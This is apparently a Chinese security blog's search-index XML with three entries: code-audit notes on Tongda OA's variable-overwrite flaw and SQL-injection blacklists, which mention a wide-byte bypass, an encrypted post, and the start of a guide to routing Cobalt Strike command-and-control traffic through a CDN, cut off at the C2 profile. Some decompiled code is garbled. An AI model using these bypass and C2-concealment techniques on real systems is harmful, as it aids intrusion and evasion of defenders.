<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>审计通达OA时的一些记录</title>
      <link href="/p/9367.html"/>
      <url>/p/9367.html</url>
      
        <content type="html"><![CDATA[<p>学习审计通达OA时发现的一些有意思的事</p><a id="more"></a><h1 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h1><p>审计时发现前辈们提到了这个问题，跟了下存在问题的文件</p><p>比如存在变量覆盖的文件是<code>pda\vote\list.php</code>，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"pda/auth.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/conn.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_all.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"mobile/api/qyapp.vote.class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($P == <span class="string">""</span>) &#123;</span><br><span class="line">$P = $_COOKIE[<span class="string">"PHPSESSID"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$P = $_GET[<span class="string">"P"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里包含了<code>inc/conn.php</code>数据库连接文件</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200723103126920.png" alt="image-20200723103126920"></p><p>继续跟，发现包含了<code>inc/td_config.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/common.inc.php"</span>;</span><br><span class="line">$ROOT_PATH = ($_SERVER[<span class="string">"DOCUMENT_ROOT"</span>] ? $_SERVER[<span class="string">"DOCUMENT_ROOT"</span>] : <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($ROOT_PATH == <span class="string">""</span>) &#123;</span><br><span class="line">$ROOT_PATH = str_replace(<span class="string">"\\"</span>, <span class="string">"/"</span>, realpath(dirname(<span class="keyword">__FILE__</span>) . <span class="string">"/../"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (substr($ROOT_PATH, <span class="number">-1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">$ROOT_PATH .= <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包含了<code>inc/common.inc.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//......代码省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; count($_COOKIE)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $s_key =&gt; $s_value ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_SERVER"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"_SESSION"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_COOKIE"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">"_GET"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">"_POST"</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($s_value)) &#123;</span><br><span class="line">$_COOKIE[$s_key] = addslashes(strip_tags($s_value));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s_key = $_COOKIE[$s_key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reset($_COOKIE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; count($_POST)) &#123;</span><br><span class="line">$arr_html_fields = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $s_key =&gt; $s_value ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_SERVER"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"_SESSION"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_COOKIE"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">"_GET"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">"_POST"</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (substr($s_key, <span class="number">0</span>, <span class="number">15</span>) != <span class="string">"TD_HTML_EDITOR_"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!is_array($s_value)) &#123;</span><br><span class="line">$_POST[$s_key] = addslashes(strip_tags($s_value));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s_key = $_POST[$s_key];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (($s_key == <span class="string">"TD_HTML_EDITOR_FORM_HTML_DATA"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_PRCS_IN"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_PRCS_OUT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_QTPL_PRCS_SET"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] &amp;&amp; (($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"approve_center"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"workflow"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"sms"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"wiki"</span>)) &amp;&amp; (($s_key == <span class="string">"CONTENT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_CONTENT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_TPT_CONTENT"</span>)))) &#123;</span><br><span class="line"><span class="keyword">unset</span>($_POST[$s_key]);</span><br><span class="line">$s_key = ($s_key == <span class="string">"CONTENT"</span> ? $s_key : substr($s_key, <span class="number">15</span>));</span><br><span class="line">$s_key = addslashes($s_value);</span><br><span class="line">$arr_html_fields[$s_key] = $s_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$encoding = mb_detect_encoding($s_value, <span class="string">"GBK,UTF-8"</span>);</span><br><span class="line"><span class="keyword">unset</span>($_POST[$s_key]);</span><br><span class="line">$s_key = substr($s_key, <span class="number">15</span>);</span><br><span class="line">$s_key = addslashes(rich_text_clean($s_value, $encoding));</span><br><span class="line">$arr_html_fields[$s_key] = $s_key;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reset($_POST);</span><br><span class="line">$_POST = array_merge($_POST, $arr_html_fields);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; count($_GET)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $s_key =&gt; $s_value ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_SERVER"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"_SESSION"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_COOKIE"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">"_GET"</span>) || (substr($s_key, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">"_POST"</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($s_value)) &#123;</span><br><span class="line">$_GET[$s_key] = addslashes(strip_tags($s_value));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s_key = $_GET[$s_key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reset($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($s_key);</span><br><span class="line"><span class="keyword">unset</span>($s_value);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只要包含了这个文件，就会存在该问题</p><h1 id="注入过滤规则"><a href="#注入过滤规则" class="headerlink" title="注入过滤规则"></a>注入过滤规则</h1><p>笔者对比了2013~2019（V11）的过滤SQL注入的代码，高版本的防注代码在<code>inc\conn.php</code>的<code>sql_injection</code>函数，低版本的在<code>exequery</code>处理，都是基于黑名单模式进行防注处理，80sec的软waf</p><h2 id="2013-exequery"><a href="#2013-exequery" class="headerlink" title="2013-exequery"></a>2013-exequery</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exequery</span><span class="params">( $C, $Q, $LOG = FALSE )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !$LOG )</span><br><span class="line">    &#123;</span><br><span class="line">        $POS = ( $Q, <span class="string">"union"</span> );</span><br><span class="line">        <span class="keyword">if</span> ( $POS !== <span class="keyword">FALSE</span> &amp;&amp; ( $Q, <span class="string">"select"</span>, $POS ) !== <span class="keyword">FALSE</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>( );</span><br><span class="line">        &#125;</span><br><span class="line">        $POS = ( $Q, <span class="string">"into"</span> );</span><br><span class="line">        <span class="keyword">if</span> ( $POS !== <span class="keyword">FALSE</span> &amp;&amp; ( ( $Q, <span class="string">"outfile"</span>, $POS ) !== <span class="keyword">FALSE</span> || ( $Q, <span class="string">"dumpfile"</span>, $POS ) !== <span class="keyword">FALSE</span> ) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>( );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ( $C ) )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !( $C ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ( $C ) )</span><br><span class="line">        &#123;</span><br><span class="line">            ( $C );</span><br><span class="line">        &#125;</span><br><span class="line">        $C = ( $C );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !( $C ) )</span><br><span class="line">    &#123;</span><br><span class="line">        ( ( <span class="string">"无效的数据库连接"</span> ).<span class="string">"&lt;br&gt;&lt;b&gt;"</span>.( <span class="string">"SQL语句:"</span> ).<span class="string">"&lt;/b&gt; "</span>.$Q, $LOG );</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $cursor = @( $Q, $C );</span><br><span class="line">    <span class="keyword">if</span> ( !$cursor )</span><br><span class="line">    &#123;</span><br><span class="line">        ( <span class="string">"&lt;b&gt;"</span>.( <span class="string">"SQL语句:"</span> ).<span class="string">"&lt;/b&gt; "</span>.$Q, $LOG );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cursor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到早年的通达仅仅检测了<code>union</code>、<code>select</code>、<code>into</code>、<code>outfile</code>、<code>dumpfile</code>这几个关键字，导致可绕过的方式很多，比如常用于盲注的<code>sleep</code>等</p><h2 id="2013adv-sql-injection"><a href="#2013adv-sql-injection" class="headerlink" title="2013adv-sql_injection"></a>2013adv-sql_injection</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_injection</span><span class="params">( $db_string )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $clean = <span class="string">""</span>;</span><br><span class="line">    $error = <span class="string">""</span>;</span><br><span class="line">    $old_pos = <span class="number">0</span>;</span><br><span class="line">    $pos = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        $pos = ( $db_string, <span class="string">"'"</span>, $pos + <span class="number">1</span> );</span><br><span class="line">        $clean .= ( $db_string, $old_pos, $pos - $old_pos );</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            $pos1 = ( $db_string, <span class="string">"'"</span>, $pos + <span class="number">1</span> );</span><br><span class="line">            $pos2 = ( $db_string, <span class="string">"\\"</span>, $pos + <span class="number">1</span> );</span><br><span class="line">            <span class="keyword">if</span> ( !$pos2 &amp;&amp; $pos1 &lt; $pos2 )</span><br><span class="line">            &#123;</span><br><span class="line">                $pos = $pos1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $pos = $pos2 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( <span class="number">1</span> );</span><br><span class="line">        $clean .= <span class="string">"\$s\$"</span>;</span><br><span class="line">        $old_pos = $pos + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ( <span class="number">1</span> );</span><br><span class="line">    $clean .= ( $db_string, $old_pos );</span><br><span class="line">    $clean = ( ( ( <span class="keyword">array</span>( <span class="string">"~\\s+~s"</span> ), <span class="keyword">array</span>( <span class="string">" "</span> ), $clean ) ) );</span><br><span class="line">    $fail = <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ( $clean, <span class="string">"union"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])union(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = ( <span class="string">"联合查询"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="number">2</span> &lt; ( $clean, <span class="string">"/*"</span> ) || ( $clean, <span class="string">"--"</span> ) !== <span class="keyword">FALSE</span> || ( $clean, <span class="string">"#"</span> ) !== <span class="keyword">FALSE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = ( <span class="string">"注释代码"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"sleep"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])sleep(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"sleep"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"benchmark"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])benchmark(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"benchmark"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"load_file"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])load_file(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = ( <span class="string">"Load文件"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"cast"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])mid(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"cast"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"ord"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])ord(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"ord"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"ascii"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])ascii(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"ascii"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"extractvalue"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])extractvalue(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"extractvalue"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"updatexml"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])updatexml(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = <span class="string">"updatexml"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( $clean, <span class="string">"into outfile"</span> ) !== <span class="keyword">FALSE</span> &amp;&amp; ( <span class="string">"~(^|[^a-z])into\\s+outfile(\$|[^[a-z])~s"</span>, $clean ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $fail = <span class="keyword">TRUE</span>;</span><br><span class="line">        $error = ( <span class="string">"生成文件"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( $fail )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> ( <span class="string">"不安全的SQL语句："</span> ).$error.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> ( $db_string );</span><br><span class="line">        <span class="keyword">exit</span>( );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $db_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2013adv的使用了<code>sql_injection</code>函数进行防注处理（过滤了<code>updatexml</code>、<code>into outfile</code>、<code>extractvalue</code>、<code>ascii</code>、<code>ord</code>、<code>cast</code>、<code>sleep</code>、<code>benchmark</code>、<code>load_file</code>、<code>union</code>关键字）</p><h2 id="2015-2016"><a href="#2015-2016" class="headerlink" title="2015~2016"></a>2015~2016</h2><p>这两个版本没什么变化，2015相对2013adv新增<code>exp</code>黑名单</p><h2 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h2><p>2017相对2016新增处理<code>&amp;#160;</code>，查表后是对应的ascii是空格</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200723110633783.png" alt="image-20200723110633783"></p><h2 id="V11"><a href="#V11" class="headerlink" title="V11"></a>V11</h2><p>与2017相同，不放代码了</p><h1 id="td-framework数据库查询处理流程"><a href="#td-framework数据库查询处理流程" class="headerlink" title="td_framework数据库查询处理流程"></a>td_framework数据库查询处理流程</h1><p>通达的<code>td_framework</code>框架（可能看的不是太清，建议新开标签页查看）</p><p><img src= "/img/loading.gif" data-lazy-src="/images/%E6%9C%AA%E5%91%BD%E5%90%8D%E8%A1%A8%E5%8D%95.png" alt="未命名表单"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于数据库是GBK编码（2013~V11都是），虽然使用了<code>addslashes</code>函数进行处理引号等字符，但是可使用宽字节<code>%df%27</code>进行绕过。通达OA这个产品由于架构比较老导致问题比较多，考虑到市场份额和影响，不放用于攻击的EXP。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 2013-2019（V11.X）前台多处注入点</title>
      <link href="/p/3504.html"/>
      <url>/p/3504.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="18c9fb3c71baef9ad239528aa8ecb1552af703b2ac5397928dfc1538751a4146">223ac6844fb0a37fce3421dc9062f07eae9f3fcff9b5225ac004648d5db08880133b543481d8f0f41f2fb1fb595931bcd3ddb9e34ce8baeb8e0b478fff08d713ab7a152b1ce61085e20f6dafa92518c832f61bf4573e8039969758e44b06bc83ec3131914ceb22c5f1a4df43a04c0ce01bba5d5f1c1ed11cb5a3aa8224c72a87359ce9b24c92777ed2831bd31c7b348219b5c159d1edaf10a70be744cc3b2c45045179354723565d3d5dea2e309b42bae6d0abe3192fc48d58871e8fa98fd028a26fc25e87309a8c9167695bbc3e5d4c3919e7439c6c45fd6ea9ddc715ef3d7c5b3097e2f78db2ee7aa301f4eca85a2d923896c77edfd0a11c1b8ac52dc6831d63959e2fb81acfde485bd4dba778b85c3ce46724f859a4acbd2e25a17b783fbd9f658dccb386c145f29863817b7094e195778187fd9b087f76e3687fb0fb1c786c3173ec672d36be62e94805ce7ea0be3d5d79b49163f168b88e010dc5babfd989d0905d91542452f22386ad084cf678b667281a9c00c076dc7f0cfb79121fcabc6aecfb6eb1ae34e31609abc96f63c817a579b348bdef948987a6582846f94d108b52447acfb9e31a84116bbc485508f6918c6710d31081d91845fb54636d9642f12e89286f32fee313effe2988a75fe1fcc5261f99f825caf070e1e9c9cbe0d0b0bb6fb17edda78b030d235cfc556beeee708121f01a2909ca91ea9ec3cd0cfae92a9a7e34dd8bd018f8104dd6e69c2f8f27f4bd5536bbe19d8e32562f0693cc709eb1136dcfdbe579be84771d31bdb14182d1cd69855a4a36a0a0e4cc62818475e1bd99308cc8ff532f6190a55403e097314e1d7b15739186a349bcb3857b7c8d43843f51921e8d3e7c1d3a1f8308027d7b6dd1eea7fbd19a26185953fb46060b7e151f8fd813a7ced0f3de5a3c1f8c8c7939a0329c6180d6a3958adb2a260fef71a4bc3e537aeaf2ca2fc4fc76ab30d9153b6b4f98d05ed9a844cdd9e7eb945a440424b3ff4b1153b0586d8dbf1f2353924d0c1b51a468c9e358adf8d82039569fb780f1cba78b38aab362df163e2086e711e4dd2a0d2714e7ae07612c50a61a64ce88acaf0a832b37e3d1e73b16ca24c66b16a446fa7c76d9ab88829e74fa878b1bb8ca3b476fca7f8f32f83a61dacfb8e8b9f6f7a56181021c3cb888637d201166c92e73cf359545b8921d31219e97cdce41f6f078b14652a8ff152e6f0383368dec682cdb51bf2b43c6ef3eab6968df2105a7894472b0e3bb36520f37dc21cf15893b1320fadeb17054aa9bafad0a5ebdd8acf728bc8988c2787439af8eee471f412d77eaa028c20c02a3438625d906a3088f331706774a7930e5477b94da8e6a225b8b1c4722aa097dfeeea49a381fa47f5cb2924c2924d4bbed1e3ee538daabc22ce300cf4a1950ee86cc46c19ce00dca4450bda426a3a079cde64ad2baef3d181a3200bc59d7752399aadd37ebcb3a182dc22e8d33f23f3a363b79b6a4bc70499a3425b331f2999b6e319b0f4130c50d3293738e1bb93cc29a3d3848d9bb27d83dc96b049d545c89369c2ed11218834cabcf21e31aa9a313fcc7a3a9105b008fc823b73b78e042364550deabea39fcd921c68597427e99ce90e63f817550cbe3abd667b48843efdf721afef3065250e0b03840f7cd466695d51d572cde115127cdfbf3ad6389ffc250dc5f06fdb7b2b983cfb7bbdf8786d946ef26c90f1c6741fad09126ec7a08415ab4fb739a9557a198e46f85ff6306ef82ec4938b8965dfe6312410800b2fdd1879ac5c0abc9ee498184e7c8e24606c7fab2b928213574c137388dffea90959b520011f63d3ec55c0166c0558ace9d4fab7db6fd1c8eaf6e69c4987611c55a4320421d6332aaaf9b7b14a5b0397742eb90492b150da3868a01a8ba233bd97674eea7e3df5bbade8296b224a99173110146778722b0c1d6dc7578c0caad2dbd5d308c30deff85435b2deed984fd9e0873faa368ac45c69e2049de9a2a7eb58f17adcf45864e97b09912284ffeb01f7bae4be93d65604c853e3138ab22250e40f7ace670dd64d7bbcaf9b7aa93ff7e9bdba870850504c2aa96f653e044fa557ed5e345d29fd7178313936c8fdc4f8f7c9c68e3d90a9cbc7dc0e741d71e842fceb4ce86d4fd9038cec0a3416b7768f2a9ba9b59d8dba4dea513501853cbff4c47d39338d8d2509de3d0f85eeb73f6f183d0fb6e862149de5bc244e39ab5e5bccbf8e0f10c2962323f50bb215979e754ee7d96ba35f456218f270c8dc9d5ccfc8903471a5405ccab5097a93a5e18206150ff455bb269af64f238dcc52d5d59d5bf296a24b9bfcdb9a0e8a07981558a1f562efe3aa79fe501c0d99ac4e02e60c659b33a132346fd7b180bb27427e6713e7258592c89e6618b0518545aed12d097f06c6d3f918c336ef536a37577ba245dee83ec95f3aeb5d2146b7b16bb7ad840b15d4685aa5d3f80851cca5b8de398f6b9ab3936feb3a8a40c7b39328e5eb41fabf539bf8065bfc1d8a3cf30716de363307a9635023db9aa2b4bfbe355ea71719ef9340b03f9a472ff00ec19022a476275bfe6140e14105bb386cb0359277c14aaa4f716d2afe50ffad51e1afb3962252a689d515480a67889dfe7778fe378f1111388f34aaaaffb2d9946ea519d29d18c6507d09e9e052947a1840f39fb5d639a99abd8527d36b3a4f4496362e0a3454173b43c825d270dc09ff2cdf6cef4a544a03bf3e59ea017e7c6dee9431981ad1837a10c9175d57a740cf304b30b49271d028d1117bc442cb88f012b36b27623552b30a2f52dd9436d124b9f0b5afd52bdc87041d3fa21ea13cfb107a3c82142a21b4b6286fa98e70db831927ce6daced7327ca75c535181fd5a8b742134fdb7a0ae4007f87c271197147b69541e17335afe7b02efe0e639165ef277f155b020cddd4487fa1269d7f0087512fd8549a7c72a1e6e86b5fe3f801ebcf4087503e0b3ccc0eeeae429bd13bab4bdc79291f39a4f000d742be7d8663015826c9712ccdace41ad99e28822468a73039e12c0ffe55207a4df67e5bda835bcd9d9f60f2989cfbc66ccd57a4700fe9dfb63d260a71f44faee5719a8ba5552d3f5949e4959926fdf7544420e5ce14150733ed285958b61a273c3a43b9176d509a3b81cd9e4c215cec4906bafd89c8d8ae6c1aa530d12927a6a78c5ef5c848a7973aba176c7ff72be119f743b91a24394a73e4bc6d6ebcbb1df64e037a0532de013116c60074075987164535447feafea375e042ba942090450ea</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> codeReview </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS通过CDN上线</title>
      <link href="/p/8dee.html"/>
      <url>/p/8dee.html</url>
      
        <content type="html"><![CDATA[<p>学习下CS通过CDN上线</p><a id="more"></a><h1 id="所需"><a href="#所需" class="headerlink" title="所需"></a>所需</h1><blockquote><p>域名*1</p><p>CDN*1</p><p>VPS*1</p></blockquote><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>域名购买后将DNS更改为CDN服务商的DNS服务器，然后等待生效</p><p>以CF为例，生效后会给邮箱发一封邮件</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200715153342479.png" alt="image-20200715153342479"></p><p>然后配置解析域名</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200715153459667.png" alt="image-20200715153459667"></p><p>CS配置文件 <strong>C2.profile</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###</span><br><span class="line"> # @Author         : Sp4ce</span><br><span class="line"> # @Date           : 2020-07-15 11:59:42</span><br><span class="line"> # @LastEditors    : Sp4ce</span><br><span class="line"> # @LastEditTime   : 2020-07-15 15:14:57</span><br><span class="line"> # @Description    : Challenge Everything.</span><br><span class="line">### </span><br><span class="line">set sample_name &quot;Etumbot&quot;;</span><br><span class="line"></span><br><span class="line">set 